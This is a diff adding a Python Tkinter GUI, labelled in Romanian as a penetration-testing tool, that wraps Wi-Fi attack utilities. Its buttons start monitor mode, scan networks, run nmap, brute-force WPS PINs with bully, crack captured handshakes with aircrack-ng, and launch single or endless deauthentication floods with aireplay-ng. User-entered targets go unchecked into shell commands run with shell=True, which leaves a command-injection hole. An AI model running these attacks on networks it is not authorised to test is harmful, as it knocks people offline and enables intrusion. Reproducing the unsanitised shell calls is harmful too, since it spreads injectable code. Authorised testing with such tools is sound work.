@@ -1,0 +1,209 @@
+import os
+import tkinter as tk
+from tkinter import messagebox, filedialog, scrolledtext
+from threading import Thread
+import subprocess
+import time
+
+# Variabilă globală pentru a controla scanarea
+scanning = False
+
+def start_monitor():
+    global scanning
+    interface = interface_entry.get().strip()
+    if not interface:
+        messagebox.showerror("Eroare", "Introdu o interfață validă.")
+        return
+
+    # Verificare compatibilitate interfață
+    check_interface = os.popen(f"iwconfig {interface}").read()
+    if "no wireless extensions" in check_interface:
+        messagebox.showerror("Eroare", "Interfața invalidă sau nu suportă Wi-Fi.")
+        return
+
+    # Pornire monitor mode
+    os.system(f"airmon-ng start {interface}")
+    output_text.insert(tk.END, "[INFO] Monitor mode pornit.\n")
+    scanning = True
+    Thread(target=scan_networks, args=(interface,)).start()
+
+def stop_monitor():
+    global scanning
+    interface = interface_entry.get().strip()
+    if interface:
+        scanning = False
+        os.system(f"airmon-ng stop {interface}mon")
+        output_text.insert(tk.END, "[INFO] Monitor mode oprit.\n")
+        network_listbox.delete(0, tk.END)
+    else:
+        messagebox.showerror("Eroare", "Introdu o interfață validă.")
+
+def scan_networks(interface):
+    # Curățare listă rețele
+    network_listbox.delete(0, tk.END)
+    csv_file = "/tmp/networks-01.csv"
+    while scanning:
+        # Pornim airodump-ng pentru 2 secunde și scriem rezultatele în CSV
+        os.system(f"timeout 2 airodump-ng {interface}mon -w /tmp/networks --output-format csv")
+        try:
+            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+                lines = f.readlines()
+        except FileNotFoundError:
+            time.sleep(1)
+            continue
+        
+        # CSV-ul are câteva linii de header, deci le sărim pe primele 2
+        for line in lines[2:]:
+            if line.strip():
+                parts = line.split(',')
+                if len(parts) > 13:
+                    bssid = parts[0].strip()
+                    channel = parts[3].strip()
+                    essid = parts[13].strip()
+                    network_str = f"{essid} ({bssid}) - canal {channel}"
+                    # Adăugăm rețeaua dacă nu este deja în listă
+                    existing = network_listbox.get(0, tk.END)
+                    if network_str not in existing:
+                        network_listbox.insert(tk.END, network_str)
+        time.sleep(1)
+
+def select_network(event):
+    # Folosim widget-ul care a declanșat evenimentul
+    selection = event.widget.curselection()
+    if not selection:
+        return
+    index = selection[0]
+    selected_item = event.widget.get(index)
+    try:
+        # Formatul așteptat: "ESSID (BSSID) - canal CHANNEL"
+        essid_part, remainder = selected_item.split(" (", 1)
+        bssid_part, channel_part = remainder.split(") - canal ")
+        selected_essid.set(essid_part.strip())
+        selected_bssid.set(bssid_part.strip())
+        selected_channel.set(channel_part.strip())
+        output_text.insert(tk.END, f"[INFO] Selectat: {selected_essid.get()} | BSSID: {selected_bssid.get()} | Channel: {selected_channel.get()}\n")
+    except Exception as e:
+        messagebox.showerror("Eroare", f"Eroare la selectarea rețelei: {str(e)}")
+
+def execute_command(command):
+    output_text.insert(tk.END, f"[EXEC] {command}\n")
+    def run_command():
+        try:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
+            for line in iter(process.stdout.readline, ""):
+                output_text.insert(tk.END, line)
+                output_text.see(tk.END)
+            process.stdout.close()
+            process.wait()
+        except Exception as e:
+            output_text.insert(tk.END, f"Error: {str(e)}\n")
+    Thread(target=run_command).start()
+
+def scan_nmap():
+    target = target_entry.get().strip()
+    if target:
+        execute_command(f"nmap -A {target}")
+    else:
+        messagebox.showerror("Eroare", "Introdu o țintă validă pentru scanare.")
+
+def brute_force_wps():
+    bssid = selected_bssid.get()
+    channel = selected_channel.get()
+    if bssid and channel:
+        execute_command(f"bully -b {bssid} -c {channel} -v")
+    else:
+        messagebox.showerror("Eroare", "Selectează o rețea validă pentru atac WPS.")
+
+def crack_handshake():
+    cap_file = filedialog.askopenfilename(filetypes=[("Fișiere Captură", "*.cap")])
+    wordlist = filedialog.askopenfilename(filetypes=[("Fișiere Text", "*.txt")])
+    if cap_file and wordlist:
+        execute_command(f"aircrack-ng -w {wordlist} {cap_file}")
+    else:
+        messagebox.showerror("Eroare", "Selectează fișierul de captură și wordlist-ul.")
+
+def attack_deauth():
+    bssid = selected_bssid.get()
+    interface = interface_entry.get().strip()
+    if bssid and interface:
+        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}mon")
+    else:
+        messagebox.showerror("Eroare", "Selectează o rețea validă pentru atac deauth.")
+
+def continuous_deauth():
+    bssid = selected_bssid.get()
+    interface = interface_entry.get().strip()
+    if bssid and interface:
+        output_text.insert(tk.END, "[INFO] Atac deauth flood continuu lansat...\n")
+        def flood():
+            os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}mon")
+        Thread(target=flood, daemon=True).start()
+    else:
+        messagebox.showerror("Eroare", "Selectează o rețea validă pentru atac deauth.")
+
+def stop_deauth():
+    output_text.insert(tk.END, "[INFO] Atac deauth flood oprit.\n")
+    os.system("killall aireplay-ng")
+
+# ---------------- Creare interfață grafică ----------------
+
+root = tk.Tk()
+root.title("Penetration Testing Complex - GUI")
+root.geometry("1200x700")
+root.configure(bg="black")
+
+# Frame-ul de sus: selectare interfață și control monitor mode
+top_frame = tk.Frame(root, bg="black")
+top_frame.pack(side=tk.TOP, fill=tk.X, padx=20, pady=10)
+
+tk.Label(top_frame, text="Interfață Wi-Fi:", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+interface_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white")
+interface_entry.pack(side=tk.LEFT, padx=5)
+tk.Button(top_frame, text="Porneste Monitor Mode", command=start_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+tk.Button(top_frame, text="Opreste Monitor Mode", command=stop_monitor, bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+
+# Frame-ul de mijloc: stânga – live output-ul comenzilor; dreapta – rețele live
+middle_frame = tk.Frame(root, bg="black")
+middle_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=20, pady=10)
+
+# Stânga: zonă de text pentru live output
+left_frame = tk.Frame(middle_frame, bg="black")
+left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)
+tk.Label(left_frame, text="Live Comenzi & Output", bg="black", fg="white").pack(anchor="w")
+output_text = scrolledtext.ScrolledText(left_frame, bg="black", fg="white")
+output_text.pack(fill=tk.BOTH, expand=True)
+
+# Dreapta: listbox pentru rețelele disponibile (live)
+right_frame = tk.Frame(middle_frame, bg="black")
+right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10)
+tk.Label(right_frame, text="Rețele Disponibile", bg="black", fg="white").pack(anchor="w")
+network_listbox = tk.Listbox(right_frame, bg="black", fg="white")
+network_listbox.pack(fill=tk.BOTH, expand=True)
+network_listbox.bind("<<ListboxSelect>>", select_network)
+
+# Frame-ul de jos: butoanele pentru atacuri și intrarea pentru ținta nmap
+bottom_frame = tk.Frame(root, bg="black")
+bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)
+
+tk.Label(bottom_frame, text="Țintă Scanare:", bg="black", fg="white").grid(row=0, column=0, padx=5, pady=5)
+target_entry = tk.Entry(bottom_frame, bg="black", fg="white", insertbackground="white")
+target_entry.grid(row=0, column=1, padx=5, pady=5)
+
+btn_texts = [
+    ("Scanare Nmap", scan_nmap),
+    ("Brute-Force WPS", brute_force_wps),
+    ("Sparge Handshake", crack_handshake),
+    ("Atac Deauth", attack_deauth),
+    ("Deauth Flood Continuu", continuous_deauth),
+    ("Opreste Deauth", stop_deauth)
+]
+
+for i, (text, cmd) in enumerate(btn_texts):
+    tk.Button(bottom_frame, text=text, command=cmd, bg="black", fg="white").grid(row=1, column=i, padx=5, pady=5)
+
+# Variabile pentru rețeaua selectată
+selected_bssid = tk.StringVar()
+selected_essid = tk.StringVar()
+selected_channel = tk.StringVar()
+
+root.mainloop()
